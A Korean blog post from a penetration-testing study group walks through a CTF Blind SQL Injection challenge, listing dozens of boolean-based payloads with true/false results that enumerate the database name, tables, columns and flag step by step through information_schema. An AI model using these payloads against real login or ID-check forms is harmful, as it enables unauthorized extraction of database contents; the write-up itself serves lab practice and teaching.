---
layout: post
comments: true
sitemap:

title: "[CTF] CTF 문제 풀이: Blind SQL Injection"
excerpt: "모의해킹 취업반 스터디 7기 7주차"

date: 2024-11-28
last_modified_at: 

categories: [CTF]
tags: [TIL, DATABASE, CTF]
---

# 목차
* [0. 회고](#0-회고)
* [CTF 문제 풀이 시작](#1-start)
* [Database 확인하기](#2-database)
    * [글자수 확인](#21-이름-글자수-확인)
    * [Database명 확인](#22-이름-확인)
* [Table 확인하기](#3-table)
    * [Table 개수 확인](#31-개수-확인)
    * [글자수 확인](#32-이름-글자수-확인)
        * [1번째 Table](#321-1번째-table)
        * [2번째 Table](#322-2번째-table)
        * [3번째 Table](#323-3번째-table)
    * [Table명 확인](#331-1번째-table)
* [Column 확인하기](#4-column)
    * [Column 개수 확인](#41-개수-확인)
    * [글자수 확인](#42-글자수-확인)
        * [1번째 Column](#421-1번째)
        * [2번째 Column](#422-2번째)
    * [Column명 확인](#432-2번째)
* [Data 확인하기](#5-data)
    * [Data 개수 확인](#51-개수-확인)
    * [글자수 확인](#52-글자수-확인)
    * [Data 확인](#53-이름-확인)
* [참고](#참고)

# 0. 회고
* Blind SQL Injection은 로그인 페이지, 아이디 중복 체크 등 결과가 참과 거짓으로 나눠질 때 사용한다.
* 사실상 가장 마지막에 쓰이는 공격으로, SQL Query문을 입력할 수 있다면 사용 가능하다.
* 글자를 하나하나 밝혀가는 것으로, 자동화하지 않은 경우 상당한 노가다를 해야 한다.
  
~~???: 한 번은 직접 손으로 풀어봐라~~  
~~???: 네~~  
그래서 사용한 코드와 결과를 일일히 적어놓았기 때문에 긴 글이 될 것이다.  
첫 부분만 결과를 사진으로 첨부하고 그 후로는 <mark>'존재하는 아이디입니다'</mark>는 <mark>O</mark>로, <mark>'존재하지 않는 아이디입니다'</mark>는 <mark>X</mark>로 표현하겠다.  

# Blind SQL Injection
## 1. START
1. **normaltic**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-14.png?raw=true)
1. **normaltic' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-15.png?raw=true)
1. **normaltic' and '1' = '1' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-16.png?raw=true)
1. **normaltic' and '1' = '2' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-17.png?raw=true)
1. **normaltic' and ('1' = '1') and '1' = '1' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-18.png?raw=true)
1. **normaltic' and ('1' = '1') and '1' = '2' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-19.png?raw=true)
1. **normaltic' and (select 'test' = 'test') and '1' = '1' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-20.png?raw=true)

## 2. DATABASE
### 2.1. 이름 글자수 확인
* `char_length(string)`: 주어진 string의 글자수를 반환한다.

---

1. **normaltic' and ((char_length(database())) > 10) #**
-> X  
1. **normaltic' and ((char_length(database())) < 6) #**
-> X  
1. **normaltic' and ((char_length(database())) < 10) #**
-> O  
1. **normaltic' and ((char_length(database())) < 8) #**
-> X  
1. **normaltic' and ((char_length(database())) = 9) #**
-> O  
-> 😭 아... 9번...

### 2.2. 이름 확인
* `SUBSTR(string, start, length)`: 주어진 string을 start 위치부터 length개를 잘라 반환한다.
* `ASCII(character)`: 글자 하나에 ASCII 값을 반환한다. ASCII CODE 범위는 0 ~ 127이다.
* 이 두 함수를 이용해 글자를 하나하나 잘라서 ASCII 코드로 변환한다. 그 후 이진탐색을 통해 그 값을 찾을 것이다.
* 모든 글자를 다 찾기는 너무나도 귀찮으니 하나씩 건너띄면서 확인하고 남은 건 예측했다.

---

1. **normaltic' and (ascii(substr((select database()), 1, 1)) > 63) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 1, 1)) > 95) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 1, 1)) > 111) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 1, 1)) > 103) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 1, 1)) > 99) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 1, 1)) > 97) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 1, 1)) = 98) #**
-> O  
-> 찾은 글자: bxx xxx xxx  
-> 예측한 글자: bxx xxx xxx  

---

1. **normaltic' and (ascii(substr((select database()), 3, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 3, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 3, 1)) > 112) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 3, 1)) > 104) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 3, 1)) > 108) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 3, 1)) > 106) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 3, 1)) > 105) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 3, 1)) = 105) #**
-> O  
-> 찾은 글자: bxi xxx xxx  
-> 예측한 글자: bxi xxx xxx  

---

1. **normaltic' and (ascii(substr((select database()), 5, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 5, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 5, 1)) > 112) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 5, 1)) > 104) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 5, 1)) > 100) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 5, 1)) > 98) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 5, 1)) = 99) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 5, 1)) = 100) #**
-> O  
-> 찾은 글자: bxi xdx xxx  
-> 예측한 글자: blind xxxx  

---

1. **normaltic' and (ascii(substr((select database()), 7, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 7, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 7, 1)) > 112) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 7, 1)) > 120) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 7, 1)) > 116) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 7, 1)) > 114) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 7, 1)) > 113) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 7, 1)) = 113) #**
-> O  
-> 찾은 글자: bxi xdx qxx  
-> 예측한 글자: blind sqlx  

---

1. **normaltic' and (ascii(substr((select database()), 9, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 9, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 9, 1)) > 112) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 9, 1)) > 104) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 9, 1)) > 108) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 9, 1)) > 106) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 9, 1)) > 105) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 9, 1)) = 105) #**
-> O  
-> 찾은 글자: bxi xdx qxi  
-> 예측한 글자: blind sqli -> s가 대문자일 수도 있어  

---

1. **normaltic' and (ascii(substr((select database()), 6, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 6, 1)) > 96) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 6, 1)) > 80) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 6, 1)) > 88) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 6, 1)) > 84) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 6, 1)) > 82) #**
-> O  
1. **normaltic' and (ascii(substr((select database()), 6, 1)) > 83) #**
-> X  
1. **normaltic' and (ascii(substr((select database()), 6, 1)) = 83) #**
-> O  
-> 찾은 글자: bxixdSqxi  
-> 예측한 글자: blindSqli  

## 3. TABLE
### 3.1. 개수 확인
* `COUNT(expression)`: select문의 결과 row 개수를 반환한다.

---

1. **normaltic' and ((select count(table_name) from information_schema.tables where table_schema = 'blindSqli') < 5) #**
-> O  
1. **normaltic' and ((select count(table_name) from information_schema.tables where table_schema = 'blindSqli') < 3) #**
-> X  
1. **normaltic' and ((select count(table_name) from information_schema.tables where table_schema = 'blindSqli') < 4) #**
-> O  
-> 3개  

### 3.2. 이름 글자수 확인
#### 3.2.1. 1번째 table
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1))) < 10) #**
-> O  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1))) < 5) #**
-> X  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1))) < 7) #**
-> X  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1))) < 8) #**
-> X  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1))) = 9) #**
-> O  
-> 😭 아... 9개...  
-> 🤔 혹시 flagTable일까?  

#### 3.2.2. 2번째 table
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 1, 1))) < 10) #**
-> O  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 1, 1))) < 5) #**
-> X  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 1, 1))) < 7) #**
-> O  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 1, 1))) < 6) #**
-> X  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 1, 1))) = 6) #**
-> O  
-> 😶 6개  
-> 🤔 얘는 member?  

#### 3.2.3. 3번째 table
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 2, 1))) < 10) #**
-> X  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 2, 1))) < 20) #**
-> O  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 2, 1))) < 15) #**
-> O  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 2, 1))) < 13) #**
-> X  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 2, 1))) < 14) #**
-> X  
1. **normaltic' and ((char_length((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 2, 1))) = 14) #**
-> O  
-> 😱 14개...  
-> 🤔 혹시 plusflagtable일까?  

### 3.3. 이름 확인
#### 3.3.1. 1번째 table
* 예측한 table 이름이 맞나 확인해보겠다

---

1. **normaltic' and (ascii(substr(((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1)), 1, 1)) = 102) #**
-> O  
-> 찾은 글자: fxxx xxxxx  
-> 예측한 글자: flagTable  
1. **normaltic' and (ascii(substr(((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1)), 5, 1)) = 84) #**
-> O  
-> 찾은 글자: fxxx Txxxx  
-> 예측한 글자: flagTable  
1. **normaltic' and (ascii(substr(((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1)), 3, 1)) = 97) #**
-> O  
-> 찾은 글자: fxax Txxxx  
-> 예측한 글자: flagTable  
1. **normaltic' and (ascii(substr(((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1)), 6, 1)) = 97) #**
-> O  
-> 찾은 글자: fxax Taxxx  
-> 예측한 글자: flagTable  
1. **normaltic' and (ascii(substr(((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1)), 9, 1)) = 101) #**
-> O  
-> 찾은 글자: fxax Taxxe  
-> 예측한 글자: flagTable  
1. **normaltic' and (ascii(substr(((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1)), 2, 1)) = 108) #**
-> O  
-> 찾은 글자: flax Taxxe  
-> 예측한 글자: flagTable  
1. **normaltic' and (ascii(substr(((select table_name from information_schema.tables where table_schema = 'blindSqli' limit 0, 1)), 8, 1)) = 108) #**
-> O  
-> 찾은 글자: flax Taxle  
-> 예측한 글자: flagTable  

## 4. COLUMN
### 4.1. 개수 확인
1. **normaltic' and ((select count(column_name) from information_schema.columns where table_name = 'flagTable') < 5) #**
-> O  
1. **normaltic' and ((select count(column_name) from information_schema.columns where table_name = 'flagTable') < 3) #**
-> O  
1. **normaltic' and ((select count(column_name) from information_schema.columns where table_name = 'flagTable') < 2) #**
-> X  
1. **normaltic' and ((select count(column_name) from information_schema.columns where table_name = 'flagTable') = 2) #**
-> O  

### 4.2. 글자수 확인
#### 4.2.1. 1번째
1. **normaltic' and ((char_length((select column_name from information_schema.columns where table_name = 'flagTable' limit 0, 1))) < 10) #**
-> O  
1. **normaltic' and ((char_length((select column_name from information_schema.columns where table_name = 'flagTable' limit 0, 1))) < 5) #**
-> O  
1. **normaltic' and ((char_length((select column_name from information_schema.columns where table_name = 'flagTable' limit 0, 1))) < 3) #**
-> X  
1. **normaltic' and ((char_length((select column_name from information_schema.columns where table_name = 'flagTable' limit 0, 1))) = 4) #**
-> X  
1. **normaltic' and ((char_length((select column_name from information_schema.columns where table_name = 'flagTable' limit 0, 1))) = 3) #**
-> X  
-> 🤔 혹시 idx?

#### 4.2.2. 2번째
1. **normaltic' and ((char_length((select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1))) < 10) #**
-> O  
1. **normaltic' and ((char_length((select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1))) < 5) #**
-> O  
1. **normaltic' and ((char_length((select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1))) < 3) #**
-> X  
1. **normaltic' and ((char_length((select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1))) = 4) #**
-> O  
-> 🤔 혹시 flag

### 4.3. 이름 확인
#### 4.3.2. 2번째
1. **normaltic' and (ascii(substr(((select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1)), 1, 1)) = 102) #**
-> O  
-> 찾은 글자: fxxx  
-> 예측한 글자: flag  
1. **normaltic' and (ascii(substr(((select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1)), 2, 1)) = 108) #**
-> O  
-> 찾은 글자: flxx  
-> 예측한 글자: flag  
1. **normaltic' and (ascii(substr(((select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1)), 3, 1)) = 97) #**
-> O  
-> 찾은 글자: flax  
-> 예측한 글자: flag  
1. **normaltic' and (ascii(substr(((select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1)), 4, 1)) = 103) #**
-> O  
-> 찾은 글자: flag  
-> 예측한 글자: flag  

## 5. DATA
### 5.1. 개수 확인
1. **normaltic' and ((select count(flag) from flagTable) < 5) #**
-> O  
1. **normaltic' and ((select count(flag) from flagTable) < 3) #**
-> O  
1. **normaltic' and ((select count(flag) from flagTable) < 2) #**
-> O  
1. **normaltic' and ((select count(flag) from flagTable) = 1) #**
-> O  
-> 🥰 1개!!!

### 5.2. 글자수 확인
1. **normaltic' and ((char_length((select flag from flagTable))) > 10) #**
-> O  
1. **normaltic' and ((char_length((select flag from flagTable))) > 20) #**
-> O  
1. **normaltic' and ((char_length((select flag from flagTable))) > 30) #**
-> O  
1. **normaltic' and ((char_length((select flag from flagTable))) > 40) #**
-> X  
1. **normaltic' and ((char_length((select flag from flagTable))) > 35) #**
-> X  
1. **normaltic' and ((char_length((select flag from flagTable))) > 32) #**
-> O  
1. **normaltic' and ((char_length((select flag from flagTable))) > 34) #**
-> X  
1. **normaltic' and ((char_length((select flag from flagTable))) > 33) #**
-> X  
1. **normaltic' and ((char_length((select flag from flagTable))) = 33) #**
-> O  
-> 😇 33개요...??

### 5.3. 이름 확인
* 요것도 예측해서 반복 횟수를 줄일 수 있었다.
* 예측 결과가 그대로 flag랑 이어지기 때문에 생략하겠다.

---

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 1, 1)) = 115) #**
-> O  
-> 찾은 글자: sxxxx xxxxx xxxxx xxxxx xxxxx xxxxx x  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 9, 1)) = 123) #**
-> O  
-> 찾은 글자: sxxxx xxx{x xxxxx xxxxx xxxxx xxxxx x  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 33, 1)) = 125) #**
-> O  
-> 찾은 글자: sxxxx xxx{x xxxxx xxxxx xxxxx xxxxx xx}  

<!-- ---

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 10, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 10, 1)) > 96) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 10, 1)) > 80) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 10, 1)) > 72) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 10, 1)) > 70) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 10, 1)) > 68) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 10, 1)) > 67) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 10, 1)) > 66) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 10, 1)) = 67) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xxxxx xxxxx xxxxx xxxxx xx}  
-> 예측한 글자: segfa ult{x xxxxx xxxxx xxxxx xxxxx xx}  

---

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 12, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 12, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 12, 1)) > 112) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 12, 1)) > 104) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 12, 1)) > 108) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 12, 1)) > 110) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 12, 1)) > 109) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 12, 1)) = 110) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxxx xxxxx xxxxx xxxxx xx}  
-> 예측한 글자: segfa ult{C xnxxx xxxxx xxxxx xxxxx xx}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 14, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 14, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 14, 1)) > 112) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 14, 1)) > 120) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 14, 1)) > 116) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 14, 1)) > 114) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 14, 1)) > 113) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 14, 1)) = 114) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxrx xxxxx xxxxx xxxxx xx}  
-> 예측한 글자: segfa ult{C xnxrx xxxxx xxxxx xxxxx xx}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 16, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 16, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 16, 1)) > 112) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 16, 1)) > 120) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 16, 1)) > 116) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 16, 1)) > 114) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 16, 1)) > 115) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 16, 1)) = 116) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxrx txxxx xxxxx xxxxx xx}  
-> 예측한 글자: segfa ult{C xnxrx xxxxx txxxx xxxxx xx}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 18, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 18, 1)) > 96) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 18, 1)) > 80) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 18, 1)) > 88) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 18, 1)) > 92) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 18, 1)) > 94) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 18, 1)) > 95) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 18, 1)) = 95) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxrx tx_xx xxxxx xxxxx xx}  
-> 예측한 글자: segfa ult{C xnxrx xxxxx tx_xx xxxxx xx}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 20, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 20, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 20, 1)) > 112) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 20, 1)) > 104) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 20, 1)) > 108) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 20, 1)) > 106) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 20, 1)) > 105) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 20, 1)) = 105) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxrx tx_xi xxxxx xxxxx xx}  
-> 예측한 글자: segfa ult{C xnxrx xxxxx tx_xi xxxxx xx}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 22, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 22, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 22, 1)) > 112) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 22, 1)) > 120) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 22, 1)) > 116) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 22, 1)) > 114) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 22, 1)) > 115) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 22, 1)) = 115) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxrx tx_xi xsxxx xxxxx xx}  
-> 예측한 글자: segfa ult{C xnxrx xxxxx tx_xi xsxxx xx}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 24, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 24, 1)) > 96) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 24, 1)) > 80) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 24, 1)) > 72) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 24, 1)) > 68) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 24, 1)) > 66) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 24, 1)) > 65) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 24, 1)) = 66) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxrx tx_xi xsxBx xxxxx xx}  
-> 예측한 글자: segfa ult{C xnxrx tx_xi xsxBx xxxxx xx}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 26, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 26, 1)) > 96) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 26, 1)) > 112) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 26, 1)) > 104) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 26, 1)) > 108) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 26, 1)) > 106) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 26, 1)) > 105) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 26, 1)) = 105) #**
-> O  
-> 찾은 글자: sxxx  x xxx{C xnxrx tx_xi xsxBx ixxxx xx}  
-> 예측한 글자: segfa ult{C xnxrx tx_xi xsxBl indxx xx}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 29, 1)) = 83) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxrx tx_xi xsxBx ixxxx xx}  
-> 예측한 글자: segfa ult{C xnxrx tx_xi xsxBl indSq li}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 19, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 19, 1)) > 96) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 19, 1)) > 112) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 19, 1)) > 104) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 19, 1)) > 100) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 19, 1)) > 102) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 19, 1)) > 101) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 19, 1)) = 102) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxrx tx_fi xsxBx ixxSx xx}  
-> 예측한 글자: segfa ult{C xnxrx tx_xi xsxBl indSq li}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 21, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 21, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 21, 1)) > 112) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 21, 1)) > 120) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 21, 1)) > 116) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 21, 1)) > 114) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 21, 1)) > 113) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 21, 1)) = 114) #**
-> O  
-> 찾은 글자: sxxxx xxx{C xnxrx tx_fi rsxBx ixxSx xx}  
-> 예측한 글자: segfa ult{C xnxrx tx_fi rstBl indSq li}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 11, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 11, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 11, 1)) > 112) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 11, 1)) > 104) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 11, 1)) > 108) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 11, 1)) > 110) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 11, 1)) > 111) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 11, 1)) = 111) #**
-> O  
-> 찾은 글자: sxxxx xxx{C onxrx tx_fi rsxBx ixxSx xx}  
-> 예측한 글자: segfa ult{C onxrx tx_fi rstBl indSq li}  

1. **normaltic' and (ascii(substr(((select flag from flagTable)), 17, 1)) > 64) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 17, 1)) > 96) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 17, 1)) > 112) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 17, 1)) > 120) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 17, 1)) > 124) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 17, 1)) > 122) #**
-> X  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 17, 1)) > 121) #**
-> O  
1. **normaltic' and (ascii(substr(((select flag from flagTable)), 17, 1)) = 122) #**
-> O  
-> 찾은 글자: sxxxx xxx{C onxrx tz_fi rsxBx ixxSx xx}  
-> 예측한 글자: segfa ult{C ongra tz_fi rstBl indSq li}   -->

# 참고
* [SQL 문자열 길이 출력 함수](https://lcs1245.tistory.com/entry/SQL-%EB%AC%B8%EC%9E%90%EC%97%B4-%EA%B8%B8%EC%9D%B4-%EC%B6%9C%EB%A0%A5-%ED%95%A8%EC%88%98-LENGTH-CHARLENGTH-LEN-DATALENGTH-LENGTHB)
* [SQL 특정 개수의 값 출력](https://lcs1245.tistory.com/entry/SQL-%ED%8A%B9%EC%A0%95-%EA%B0%9C%EC%88%98%EC%9D%98-%EA%B0%92-%EC%B6%9C%EB%A0%A5-SELECT-TOP-N-TOP-LIMIT-ROWNUM?category=348747)
